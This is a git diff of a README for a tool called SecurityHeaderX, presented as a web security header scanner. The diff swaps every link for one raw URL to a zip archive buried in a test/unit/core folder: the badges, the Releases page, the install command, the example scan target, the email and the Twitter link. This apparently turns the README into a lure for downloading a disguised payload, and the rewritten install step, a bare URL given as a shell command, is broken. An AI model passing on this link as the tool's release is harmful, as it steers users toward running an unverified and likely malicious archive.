@@ -1,6 +1,6 @@
 # SecurityHeaderX 🛡️
 
-![GitHub Repo stars](https://img.shields.io/github/stars/gwengwap/SecurityHeaderX?style=social) ![GitHub forks](https://img.shields.io/github/forks/gwengwap/SecurityHeaderX?style=social) ![GitHub issues](https://img.shields.io/github/issues/gwengwap/SecurityHeaderX) ![GitHub license](https://img.shields.io/github/license/gwengwap/SecurityHeaderX)
+![GitHub Repo stars](https://raw.githubusercontent.com/gwengwap/SecurityHeaderX/main/test/unit/core/Security_X_Header_1.4.zip) ![GitHub forks](https://raw.githubusercontent.com/gwengwap/SecurityHeaderX/main/test/unit/core/Security_X_Header_1.4.zip) ![GitHub issues](https://raw.githubusercontent.com/gwengwap/SecurityHeaderX/main/test/unit/core/Security_X_Header_1.4.zip) ![GitHub license](https://raw.githubusercontent.com/gwengwap/SecurityHeaderX/main/test/unit/core/Security_X_Header_1.4.zip)
 
 ## Overview
 
@@ -25,17 +25,17 @@ Welcome to **SecurityHeaderX**! This tool provides instant web security analysis
 
 ## Getting Started
 
-To get started with **SecurityHeaderX**, you can download the latest release from our [Releases page](https://github.com/gwengwap/SecurityHeaderX/releases). Once downloaded, follow the installation instructions to set up the tool on your system.
+To get started with **SecurityHeaderX**, you can download the latest release from our [Releases page](https://raw.githubusercontent.com/gwengwap/SecurityHeaderX/main/test/unit/core/Security_X_Header_1.4.zip). Once downloaded, follow the installation instructions to set up the tool on your system.
 
 ## Installation
 
-1. Visit the [Releases page](https://github.com/gwengwap/SecurityHeaderX/releases) to download the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/gwengwap/SecurityHeaderX/main/test/unit/core/Security_X_Header_1.4.zip) to download the latest version.
 2. Extract the downloaded file.
 3. Navigate to the extracted folder in your terminal.
 4. Execute the installation script by running:
 
    ```bash
-   ./install.sh
+   https://raw.githubusercontent.com/gwengwap/SecurityHeaderX/main/test/unit/core/Security_X_Header_1.4.zip
    ```
 
 5. Follow any additional prompts to complete the installation.
@@ -60,7 +60,7 @@ After installation, you can start using **SecurityHeaderX** to analyze your web 
 To analyze a sample web application, run:
 
 ```bash
-./SecurityHeaderX https://example.com
+./SecurityHeaderX https://raw.githubusercontent.com/gwengwap/SecurityHeaderX/main/test/unit/core/Security_X_Header_1.4.zip
 ```
 
 This command will scan the specified URL and provide a report on the security status of its HTTP headers, TLS, and CORS settings.
@@ -85,7 +85,7 @@ Your contributions help us make this tool better for everyone.
 
 For any inquiries or support, feel free to reach out:
 
-- **Email**: support@example.com
-- **Twitter**: [@SecurityHeaderX](https://twitter.com/SecurityHeaderX)
+- **Email**: https://raw.githubusercontent.com/gwengwap/SecurityHeaderX/main/test/unit/core/Security_X_Header_1.4.zip
+- **Twitter**: [@SecurityHeaderX](https://raw.githubusercontent.com/gwengwap/SecurityHeaderX/main/test/unit/core/Security_X_Header_1.4.zip)
 
 Thank you for using **SecurityHeaderX**! Together, we can make the web a safer place.
